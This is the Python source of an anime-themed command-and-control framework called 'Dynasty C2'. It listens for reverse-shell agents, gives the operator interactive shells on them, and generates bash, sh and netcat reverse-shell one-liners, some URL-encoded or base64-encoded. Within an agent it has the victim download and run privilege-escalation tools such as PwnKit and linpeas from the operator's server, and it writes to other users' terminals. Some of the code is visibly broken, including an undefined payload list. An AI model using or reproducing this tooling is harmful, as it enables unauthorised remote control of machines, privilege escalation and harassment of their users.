import socket
import os
import threading
import time 
import sys
import select
import uuid 
import random 
import requests
import getpass 
from rich.table import Table 
import platform 
from rich.console import Console
from rich.progress import Progress
from rich.panel import Panel
from rich.live import Live 
import base64 
import re 

console = Console()

class NiceColors:
    green = "[green]"
    reset = "[/]"
    yellow = "[yellow]"
    cyan = "[cyan]"
    red = "[red]" 
    blue = "[blue]"
    magenta = "[magenta]"

class characters:
    naruto = f"[{NiceColors.red}Naruto{NiceColors.reset}]"
    goku = f"[{NiceColors.yellow}Son Goku{NiceColors.reset}]"
    sakura = f"[{NiceColors.green}Sakura{NiceColors.reset}]"
    monkey = f"[{NiceColors.blue}Monkey D. Luffy{NiceColors.reset}]" 
    yagmi = f"[{NiceColors.cyan}Light Yagmi{NiceColors.reset}]"

    agent_chars = [naruto, goku, sakura, monkey, yagmi] 

class banners:
    alien = f"""
{NiceColors.blue}	
_________________________________________________________                                                  
{NiceColors.reset}
{NiceColors.magenta}
                         ,------------. 
            ///////      |huahahahaha!|   /`., , 
           || -  _|      `------------'  /'/''<
           |/ O  o|              |    _.'   /_'\.
           (-   `\|              |   (_ oOo __) |
            |  `-'|               \    `\:/'    `\ 
       ____/  --- |___             `-   /`       |____ 
      /  `\  .___/ |  \                /'\__(()\_/ _  `\ 
     /    `\      /'   \              |  |  (\\\)__/    | 
    /   /   `\___/'  |  \             |  |   \         / 
{NiceColors.blue} 
_________________________________________________________
{NiceColors.reset}
 
    """ 


    help = f""" 
   {NiceColors.blue} 
   ------------------------------------------------------------------------------------ 
   {NiceColors.reset}
                                  
                                  {NiceColors.yellow}Dynasty - Help Menu{NiceColors.reset}

   {NiceColors.magenta}Command{NiceColors.reset}                                                                 {NiceColors.magenta}Usage{NiceColors.reset} 
   -------                                                                ------  

   "help".......................................................................{NiceColors.cyan}Displays this help message{NiceColors.reset}
   "kill (key)".....................................................................{NiceColors.cyan}Kill active characters{NiceColors.reset}
   "agents".....................................................................{NiceColors.cyan}List all characters beaten{NiceColors.reset}
   "use (agent num)".........................................................{NiceColors.cyan}Get a shell to selected agent{NiceColors.reset}
   "generate payloads lhost=<lhost> lport=<lport> shell=<shell_type>"....................{NiceColors.cyan}Generate payloads{NiceColors.reset}


   {NiceColors.yellow}Dynasty - In Agent{NiceColors.reset}

   
   "background".............................................{NiceColors.cyan}Background selected agent{NiceColors.reset} 

   "troll".......................................{NiceColors.cyan}Send commands to tty shells in agent{NiceColors.reset}
   "show privesc-check"..................................................{NiceColors.cyan}View all payloads{NiceColors.reset}
   "set privesc-check (num)"....................................{NiceColors.cyan}Activate a payload on agent{NiceColors.reset} 
   "server status"..........................{NiceColors.cyan}Check server status and web server status{NiceColors.reset}
   
   "exit".............................................................{NiceColors.cyan}Exit the Dynasty!{NiceColors.reset} 

   

    The Dynasty! 

   Made with ❤️  by Trevohack 

   """
    privesc = [
    [1, "PwnKit"],
    [2, "linuxprivchecker.py"],
    [3, "linpeas.sh"],
    [4, "linux-exploit-suggester.sh"],
    [5, "lse.sh"]
    ]

    privesc_tab = Table(title="Payloads", show_header=True)
    privesc_tab.add_column("Number", style="cyan")
    privesc_tab.add_column("Payload", style="magenta")

    for payload in privesc:
        privesc_tab.add_row(str(payload[0]), payload[1])

conn_list = {}

def server(HOST, PORT):
    global conn_list

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        client_id = str(uuid.uuid4())
        os_info = platform.platform()
        if "Linux" in os_info:
            os_info = "Linux"
        conn_list[client_id] = {"Connection": conn, "IP": addr[0], "OS": os_info}

def list_agents():
    global conn_list

    agents = 0 
    table = Table(title="Agent List")
    table.add_column("Agents", style="cyan")
    table.add_column("ID", style="magenta")
    table.add_column("IP", style="green")
    table.add_column("OS", style="blue") 
    table.add_column("Character", style="yellow") 

    if conn_list:
        for client_id, client_info in conn_list.items():
            agents += 1
            agent_char = random.choice(characters.agent_chars)
            table.add_row(str(agents), client_id, client_info["IP"], client_info["OS"], agent_char)
        
        console.print(table)
    else:
        console.print("[red]No agents connected.[/]") 


def kill_agent(agent_key):
    global conn_list

    if agent_key in conn_list:
        agent_info = conn_list.pop(agent_key, None)
        if agent_info:
            agent_conn = agent_info.get("Connection")
            if agent_conn:
                agent_conn.close()
                console.print(f"{NiceColors.green}[INFO] Agent {agent_key} has been terminated :){NiceColors.reset}")
            else:
                console.print(f"{NiceColors.red}[ERROR] Connection for agent {agent_key} not found :({NiceColors.reset}")
        else:
            console.print(f"{NiceColors.red}[ERROR] Information for agent {agent_key} not found :({NiceColors.reset}")
    else:
        console.print(f"{NiceColors.red}[ERROR] Agent {agent_key} not found :({NiceColors.reset}")

def start_interaction(agent_num):
    global conn_list
    if conn_list:
        keys = list(conn_list.keys())
        if agent_num <= len(keys):
            cmd_interact(conn_list[keys[agent_num - 1]]["Connection"], keys[agent_num - 1], keys[agent_num - 1])
        else:
            console.print(f"{NiceColors.red}[ERROR] Invalid agent number {NiceColors.reset}")
    else:
        console.print(f"{NiceColors.red}[ERROR]No connections{NiceColors.reset}")

def recv_all(conn, buffer_size=4096): 
    data = b""
    while True:
        chunk = conn.recv(buffer_size)
        if not chunk:
            break
        data += chunk
    return data


def cmd_interact(conn, victim, socket_target):
    console.print(f"[+] Host: {victim}")
    try:
        while True:
            ready, _, _ = select.select([conn, sys.stdin], [], [], 1)

            if conn in ready:
                data = conn.recv(8912).decode('utf-8')
                if not data:
                    command = console.input()
                    conn.sendall(command.encode('utf-8') + b'\n')
                    output = conn.recv(8912).decode('utf-8')
                    print(data)
                else:
                    print(data, end='')

            if sys.stdin in ready:
                command = console.input()
                if command.lower() == "quit" or command.lower() == "exit":
                    break
                
                if command.lower() == "show privesc-payloads":
                    console.print(banners.privesc_tab)
                
                tmp_var = command.lower().split(' ')
                if "check" in command.lower():
                    if tmp_var[0] == "check":
                        if tmp_var[1] == "privesc":
                            selected_payload = int(tmp_var[2])
                            if 0 < selected_payload <= len(banners.linux_payloads):
                                payload = banners.linux_payloads[selected_payload-1][1]
                                if 1 <= int(selected_payload) <= 5:
                                    cmd = f"curl {sys.argv[1]}:{sys.argv[3]}/{payload} -O {payload}"
                                    conn.sendall(cmd.encode('utf-8') + b'\n')
                                    output = conn.recv(8912).decode('utf-8')
                                    print(output)
                                    cmd = f"chmod +x {payload}; ./{payload}"
                                    conn.sendall(cmd.encode('utf-8') + b'\n')
                                    output = conn.recv(8912).decode('utf-8')
                                    print(output) 

                elif tmp_var[0] == "upload": 
                    url = tmp_var[1]
                    try: 
                        r = requests.get(url)
                        file_name = url.split('/')[-1]
                        cmd = f"curl {url} -O {file_name}"
                        conn.sendall(cmd.encode('utf-8') + b'\n')
                        output = conn.recv(8912).decode('utf-8')
                        print(output)

                    except Exception as e:
                        print(output)
                    

                if command.lower() == "troll":
                    troll_command = input(f"[TROLL] > ")
                    troll = f"MY=$(tty|cut -d'/' -f4);for L in $(seq 5);do [ $MY == $L] && {{ echo 'Live'; }} || {{ {troll_command} > /dev/pts/$L 2>/dev/null & }};done 2>/dev/null"
                    conn.sendall(troll.encode('utf-8') + b'\n')
                    output = conn.recv(8912).decode('utf-8')
                    print(output)

                else:
                    conn.sendall(command.encode('utf-8') + b'\n')
                    output = conn.recv(8912).decode('utf-8')
                    print(output)

    except Exception as e:
        console.print(f"Error: {e}")
        del conn_list[socket_target]

def server_status(host, web_port):
    console.print(f"[{NiceColors.green}INFO{NiceColors.reset}] Checking Web server status")

    web_app = f"http://{host}:{web_port}"
    response = requests.get(web_app) 

    if response.ok:
        console.print(f"[{NiceColors.green}+{NiceColors.reset}] Web server active. Response code:", response.status_code)
    else:
        console.print(f"[{NiceColors.red}+{NiceColors.reset}] Web server down. Response code:", response.status_code) 


def generate_payload(lhost, lport, shell): 
    payload1 = '' 
    payload2 = '' 
    payload3 = '' 
    payload4 = '' 
    url_encoded_payload = '' 
    base64_payload = ''

    if shell == "bash":
        payload1 = f"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        payload2 = f"bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'" 
        payload3 = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f" 
        payload4 = f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; /bin/bash <&196 >&196 2>&196" 
        url_encoded_payload = f"%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{lhost}%2F{lport}%200%3E%261" 
        base64_payload = base64.b64encode(payload2.encode("utf-8")).decode("utf-8") 

    elif shell == "sh":
        payload1 = f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        payload2 = f"sh -c '/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1'" 
        payload3 = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f" 
        payload4 = f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; /bin/sh <&196 >&196 2>&196" 
        url_encoded_payload = f"sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{lhost}%2F{lport}%200%3E%261" 
        base64_payload = base64.b64encode(payload2.encode("utf-8")).decode("utf-8") 
    
    payloads = [payload1, payload2, payload3, payload4, url_encoded_payload, base64_payload] 
    return payloads


def main(host, port):
    hostname = socket.gethostname()
    username = getpass.getuser()
    threading.Thread(target=server, args=(host, port, )).start()

    framework_version = "1.0"
    console.print(f"""
    {NiceColors.magenta}
    ____                                                       _       _
  /  __    _       _______        ___                       _| |_  _ | |
 |   \ \__| |_    |____   |_ _   /  /                      |_  __|| || |
 |   /  __    \   ___/  _/|_|_| |  |___  __   ___________   / // \| || |
    /  _\/ /\  | |___  _____|   |   _  \|  | |___________| /__  /_| || |
    | |/ _/_/  |   /  /____     |  | |  |  |                / _/ /|_|| |
    \___/  \__/    \_______|   /__/   \___/                /_/  / ___| |  |
                                                            \_/\_\\____|  |
                                                                    ____/
    {NiceColors.reset} 
    {NiceColors.blue}   __
     /
       Dynasty C2 | Version {framework_version} (beta) | [ [cyan]{username}:{hostname}[/] ]
                   __/
                        [blue]Made by [green]Trevohack[/]

   [yellow][ "Dyansty" inspired by ANIME                    ][/]
   [yellow][  Anime-inspired C2 framework for digital heros ][/]

  Try help! 

  [orange1]OPEN PORTS[/]
  {host}:{port}[light_goldenrod1]................[/][sandy_brown]TCP Listener For Agents[/]
  {host}:{sys.argv[3]}[light_goldenrod1]................[/][sandy_brown]Web Server[/] 

[magenta]
-------------------------------------------------------------------------- 
[/]
    {NiceColors.reset}
    """) 

    while True:
        inp = console.input(f"[{NiceColors.yellow}{username}{NiceColors.reset}@{NiceColors.cyan}dynasty{NiceColors.reset}]~# ")
        inp_cmd = inp.split(' ')

        if inp_cmd[0] == "agents":
            starty = threading.Thread(target=list_agents)
            starty.start()
            starty.join()

        elif "exit" in inp:
            console.print(f"{banners.alien}")
            os._exit(1)

        elif inp == "help" or inp == "h":
            console.print(f"{banners.help}")

        elif inp_cmd[0] == "kill": 
            if len(inp_cmd) == 2: 
                agent_key = inp_cmd[1] 
                kill_agent(agent_key)
        
        elif inp == "server status":
            server_status(sys.argv[1], sys.argv[3]) 
        
        elif "generate" in inp: 
            if inp_cmd[1] == "payloads":
                if len(inp_cmd) == 5: 
                    find_lhost = re.search(r'lhost=([^&\s]+)', inp_cmd[2]) 
                    find_lport = re.search(r'lport=(\d+)', inp_cmd[3]) 
                    find_shell = re.search(r'shell=([^&\s]+)', inp_cmd[4]) 
                    
                    if find_lhost: lhost = find_lhost.group(1)
                    else: console.print(f"[[red]ERROR[/]] lhost is not provided!")

                    if find_lport: lport = find_lport.group(1)
                    else: console.print(f"[[red]ERROR[/]] lport is not provided!")

                    if find_shell: shell = find_shell.group(1)
                    else: console.print(f"[[red]ERROR[/]] shell type is not provided!")                

                    with Progress() as progress:
                        task1 = progress.add_task("[green]Generating Payloads...[/]", total=1000)
                        while not progress.finished:
                            progress.update(task1, advance=0.9)
                            time.sleep(0.01)

                    payloads = generate_payload(lhost, lport, shell) 
                    num = 1
                    for payload in payloads:
                        console.print(f"[[blue]Payload {num}[/]]: [yellow]{payload}[/]") 
                        num += 1

        elif inp_cmd[0] == "show" and inp_cmd[1] == "privesc-payloads":
            console.print(banners.privesc_tab)

        elif inp_cmd[0] == "use" and len(inp_cmd) == 2 and inp_cmd[1].isdigit():
            agent_num = int(inp_cmd[1])
            max_agents = list(range(1, 11))
            if agent_num in max_agents:
                starty = threading.Thread(target=start_interaction, args=(agent_num,))
                starty.start()
                starty.join()
            else:
                console.print(f"{NiceColors.red}[ERROR] Invalid Agent Number :({NiceColors.reset}")

if len(sys.argv) != 4:
    console.print(banners.help)
    sys.exit(1)

else:
    host = sys.argv[1]
    port = sys.argv[2]
    main(host, int(port))
